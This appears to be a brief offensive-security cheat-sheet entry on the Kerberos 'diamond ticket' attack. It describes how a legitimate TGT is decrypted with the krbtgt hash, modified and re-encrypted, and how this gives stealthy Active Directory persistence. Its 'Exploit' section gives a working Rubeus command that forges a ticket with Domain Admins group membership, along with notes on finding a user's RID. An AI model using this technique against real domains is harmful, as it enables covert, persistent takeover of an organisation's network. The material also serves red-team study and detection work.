# Diamond Ticket

A diamond ticket is a TGT which can be used to access any service as any user. A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it.

### **Attack Prerequisites**

* krbtgt AES256 hash
* Access to krbtgt password hash

### **Purpose of Diamond Ticket**

The diamond ticket attack is a post exploitation attack where an attacker has already compromise the domain admin account. It is primarily **used for host persistence** instead of privilege escalation.

A Diamond Ticket works identically to a Golden Ticket, however it is **more stealthy** and **harder to detect**.

### Exploit

```sh
Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:[key] /nowrap
# /groups:512 (512 for domain admins)
# /ticketuserid (domain RID of user) 
# use powershell command wmic useraccount get domain,name,sid to got user SID 
# Example SID for nlamb: S-1-5-21-569305411-121244042-2357301523-1106
# Therefore RID for nlamb is 1106

Rubeus.exe describe /ticket:doIFYj[...snip...]
```
